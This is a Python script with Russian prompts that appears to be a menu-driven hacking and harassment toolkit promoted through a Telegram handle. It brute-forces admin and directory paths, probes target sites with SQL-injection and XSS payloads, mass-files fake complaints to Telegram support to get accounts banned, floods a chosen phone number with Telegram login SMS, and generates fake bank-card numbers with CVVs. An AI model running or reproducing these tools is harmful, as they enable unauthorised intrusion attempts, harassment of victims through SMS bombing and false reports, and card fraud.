import time
import requests
import random
import socket
import telebot
import colorama
from colorama import Fore, Back, Style
import os
from datetime import datetime
#from art import tprint


headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}

colorama.init()
print (Fore.YELLOW + "")

lg = """
1
"""


def baza():
    print (Fore.RED + "")
    from search import search
    search()
    s = input("Нажмите enter")
    time.sleep(1)
    
    
    
    
    
    


#time.sleep(1)


print (Fore.RED + "")





txt = """
░░▄▄▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄░░
░▄████▄░░░░░░░░░░░░░░░░░░░░░░░▄▄████▄░
░██░▀▀███▄▄░▄▄▄████████▄▄▄░▄▄███▀░███░
░██░░░░░▀███████▀████▀▀██████▀░░░░███░
░██▄░░░░░░░░░▀█▀░███░░░██▀▀░░░░░░░██▀░
░▀██▄▄░░░░░░░░░░░░▀░░░░▀░░░░░░░▄▄▄██░░
░░▀██▀░░░░░░░░░░░░░░░░░░░░░░░░░▀███▀░░
░░▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▄░░
░░████▀░░███░░░░░░░░░░░░░░███░░█████░░
░░███▀░░░█████░░░░░░░░░░█████░░░▀███░░
░░██░░░░░░▀▀▀▀░░░░░░░░░░▀▀▀▀░░░░░▀██░░
▄▄███▄▄▄▄░░░░░░░░░░░░░░░░░░░░▄▄▄▄███▄▄
░▄▄██▄▄░░░▄█░░░░▄▀▀▀▀▄░░░░█▄░░░▄███▄▄░
▀░░▄████▀▀▀▀░░░░░▀▄▄▀░░░░░▀▀▀▀████▄░░▀
░▄▀░░▀███▄▄░░░█▄▄█▀▀█▄▄▀░░░▄▄██▀░░░▀▄░
░░░░░░░░▀███▄▄░░░░░░░░░░▄▄███▀░░░░░░░░
░░░░░░░░░░▀▀████▄▄▄▄▄▄████▀▀░░░░░░░░░░
░░░░░░░░░░░░░░▀▀▀▀▀▀▀▀▀▀░░░░░░░░░░░░░░

"""

#txt = 'текст который нужен'
for i in txt:  # этот цикл будет брать по 1 буковке из тхт
    print(i, end='', flush=True)

#time.sleep(1)




print (Fore.YELLOW + "")
#time.sleep(1)




    
def genip():
    
    ips = input('Кол-во:')

    print (Fore.RED + "")


    print ('1. Запись в txt файл')
    print ('2. Вывод в консоль')

    kuda = input('>')
    

    if kuda == "1":
        
        for i in range(int(ips)):
            with open("ipexit.txt", "w") as file:
                for i in range(int(ips)):
                    ip_address = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255)) + '.' + str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
                    file.write(str(ip_address) + "\n")
                    print (Fore.YELLOW + 'Ip Адресс записан!')
                    
        print (Fore.BLUE + "Ip Адреса записаны в файл (ipexit)")
        time.sleep(5)

    if kuda == "2":

        for i in range(int(ips)):
            ip_address = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255)) + '.' + str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            print("Ip:", ip_address)
        print (Fore.GREEN + "Готово")
        time.sleep(35)
        
            



                

def gen():
    kol = input("Количество номеров:")
    time.sleep(1)
    print ("Номера...")
    for h in range(int(kol)):
        phone = random.randint(79000000000, 79999999999)
        print (phone)
    p = input("Нажми enter")

def gp():
    print (Fore.GREEN + '')
    
    target_url = input("Введите URL сайта для проверки: ")
    
    payloads_sql = ["' OR '1'='1", '" OR "1"="1']
    
    payloads_xss = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
    
    for payload in payloads_sql:
        response = requests.get(f"{target_url}?id={payload}")
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print (Fore.RED + '')
            print(f"SQL-инъекция найдена: {response.url}")
        else:
            print (Fore.YELLOW + '')
            print ('SQL не найден! +++ Сайт защищён!')
    time.sleep(62)

    for payload in payloads_xss:
        response = requests.get(f"{target_url}?search={payload}")
        if payload in response.text:
            print (Fore.RED + '')
            print(f"XSS уязвимость найдена: {response.url}")
        else:
            print (Fore.YELLOW + '')
            print ('XSS не найден! +++Сайт защищён!')
    time.sleep(62)
            
    

def snos():
    url = "https://telegram.org/support"
    text = input("Введите жалобу:")
    print ("URL")
    name = input(">")
    kl = input("Кол-во жалоб:")
    ml = "@gmail.com"
    ban = (text, name)
    time.sleep(1)
    for i in range(int(kl)):
        
        num = random.randint(79111111111, 79999999999)
        mail = random.randint(1111111111, 99999999999)
        ms = (str(mail) + ml)
        res = requests.post(url, data={'message': ban} and {'email': ms} and {'phone': num}, headers=headers)
        print ("СНОС ТГ...", res.status_code)
                

            
                
def sms():
    tgs = "https://my.telegram.org/auth/send_password"
    ph = input("Номер:")
    pv = input("Кол-во sms:")
    for k in range(int(pv)):
        res = requests.post(tgs, data={'phone': ph}, headers=headers)
        print ("Cообщение отправлено!", res.status_code)
        time.sleep(0.75)
    
    

print (Fore.CYAN +  'Telegramm: @exitbaza')
#print (Fore.YELLOW +  "_____________________________________________")
print (Fore.YELLOW + "")
mn = """
[+] 1. Поиск каталогов сайта  
[+] 2. Генератор Номеров  
[+] 3. Общение с users через бота тг  
[+] 4. Поиск SQL уязвимостей  
[+] 5. Сносер  
[+] 6. Смс Telegram  
[+] 7. Генератор IP  
[+] 8. Генератор карт  
[+] 9. Поиск по базам  
[+] 0. Выход  
"""
print (mn)
print ("---------------------------------------------")
user = input("[+] Введите номер действия>")

if user == "5":
    snos()

if user == "7":
    genip()
    
if user == "9":
    baza()



if user == "4":
    gp()

if user == "2":
    gen()

if user == "0":
    exit()

if user == "6":
    sms()

if user == "3":
    token = input("Токен бота:")
    bot = telebot.TeleBot(token)
    @bot.message_handler(commands=["start"])
    def start(m, res=False):
        bot.send_message(m.chat.id, 'Я на связи. Напиши мне что-нибудь )')
        while True:
            @bot.message_handler(content_types=["text"])
            def handle_text(message):
                print ("Noname:", message.text)
                n = input("Вы:")
                bot.send_message(m.chat.id, n)
    bot.polling(none_stop=True, interval=0)

if user == "1":
    url = input("url:")
    

    adm = [
    'admin',
    'administrator',
    'adminpanel',
    'login',
    'controlpanel',
    'dashboard',
    'manage',
    'backend',
    'panel',
    'wp-admin',
    'user',
    'secure',
    'paneladmin',
    'cpanel',
    'siteadmin',
    'webadmin',
    'auth',
    'access',
    'settings',
    'config',
    'system',
    'backendpanel',
    'management',
    'administratorpanel',
    'useradmin',
    'portal',
    'secureadmin',
    'dashboardpanel',
    'adminarea',
    'settingspanel',
    'usercontrol',
    'adminlogin',
    'adminconsole',
    'sitecontrol',
    'adminzone',
    'backendlogin',
    'control',
    'admininterface',
    'adminhome',
    'systemadmin',
    'configuration',
    'adminroot',
    'controlroom',
    'adminaccess',
    'administration',
    'memberadmin',
    'siteadminpanel',
    'adminsettings',
    'adminspace',
    'userpanel'
]
# rasdel



    kt = [
    'blog',
    'users',
    'settings',
    'content',
    'reports',
    'security',
    'access',
    'logging',
    'support',
    'integrations',
    'monitoring',
    'dashboard',
    'analytics',
    'notifications',
    'roles',
    'permissions',
    'database',
    'backup',
    'restore',
    'performance',
    'activity',
    'api',
    'data',
    'status',
    'updates',
    'customization',
    'themes',
    'plugins',
    'modules',
    'configuration',
    'logs',
    'session',
    'feedback',
    'groups',
    'search',
    'billing',
    'invoices',
    'subscriptions',
    'transactions',
    'reports',
    'visualization',
    'segmentation',
    'testing',
    'settings',
    'sitemap',
    'cache',
    'firewall',
    'certificates',
    'registration',
    'policies',
    'authentication',
    'verification',
    'products',
    'orders',
    'inventory',
    'shipping',
    'payment',
    'discounts',
    'promotions',
    'support',
    'tickets',
    'knowledge',
    'community',
    'feedback',
    'requests',
    'reports',
    'logs',
    'settings',
    'notifications',
    'engagement',
    'integration',
    'metrics',
    'configuration',
    'retention',
    'privacy',
    'terms',
    'consent',
    'compliance',
    'accessibility',
    'mobile',
    'multi-language',
    'scheduling',
    'tutorials',
    'mapping',
    'cleaning',
    'validation',
    'insights',
    'fields',
    'tags',
    'categories',
    'sources',
    'segmentation',
    'metadata',
    'parameters',
    'variables',
    'elements',
    'settings',
    'options',
    'features',
    'modules',
    'components',
    'widgets',
    'dashboard',
    'profiles',
    'roles',
    'permissions',
    'settings'
]

    print ('1. Поиск админ панели')
    print ('2. Поиск других каталогов')
    print (Fore.BLUE + '')

    usvb = input("Выерите значение:")

    

    if usvb == "1":
        for term in adm:
            
            res = requests.get(url + term, headers=headers)
            print (Fore.BLUE + '')
            if (res.status_code) == 200:
                print ("+ Запрос отправлен:", term, Fore.YELLOW + "Успешно найдено")
                
            else:
                print ("+ Запрос отправлен:", term, Fore.RED + "No katalog")
                
    else:
        for ln in kt:
            
            res = requests.get(url + ln, headers=headers)
            print (Fore.BLUE + '')
            if (res.status_code) == 200:
                print ("+ Запрос отправлен:", ln, Fore.YELLOW + "Успешно найдено")
                
            else:
                print ("+ Запрос отправлен:", ln, Fore.RED + "No katalog")


if user == "8":
    logo = """
░█▀▀█ ─█▀▀█ ░█▀▀█ ░█▀▀▄ ░█▀▀▀ ░█▀▀█ 
░█─── ░█▄▄█ ░█▄▄▀ ░█─░█ ░█▀▀▀ ░█▄▄▀ 
░█▄▄█ ░█─░█ ░█─░█ ░█▄▄▀ ░█▄▄▄ ░█─░█

"""
    print(logo)
    ch = "--------------------------------------------"
    
    name = input("Имя на карте:")
    kol = input("Количество карт:")
    
    print ("1. Записать в файл card.txt")
    print ("2. Вывести в консоль")
    
    ff = input("Введите значение>")
    if ff == "1":
        print ("Запись в txt файл")
        time.sleep(1)
        for i in range(int(kol)):
            with open("card.txt", "w") as file:
                for i in range(int(kol)):
                    
                    kard = random.randint(2200000000000000, 2200999999999999)
                    cvv = random.randint(000, 999)
                    data = f"{random.randint(1, 12):02}/{(datetime.now().year % 100) + random.randint(1, 3)}"
                    print ("Запись")
                    
                    names = ('Держатель карты:' , name)
                    kards = ("Номер карты:", kard)
                    cvvs = ("CVV:", cvv)
                    datas = ("Cрок действия:", data)
                    
                    file.write(str(names) + "\n")
                    file.write(str(kards) + "\n")
                    file.write(str(cvvs) + "\n")
                    file.write(str(datas) + "\n")
                    file.write(str(ch) + "\n")
    if ff == "2":
        for i in range(int(kol)):
            
            kard = random.randint(2200000000000000, 2200999999999999)
            cvv = random.randint(000, 999)
            data = f"{random.randint(1, 12):02}/{(datetime.now().year % 100) + random.randint(1, 3)}"
            print ("Держатель карты:", name)
            print ("Номер карты:", kard)
            print ("CVV:", cvv)
            print ("Cрок действия:", data)
            print (ch)
        







                
        

    
    
    
    
    
      
    
    










    
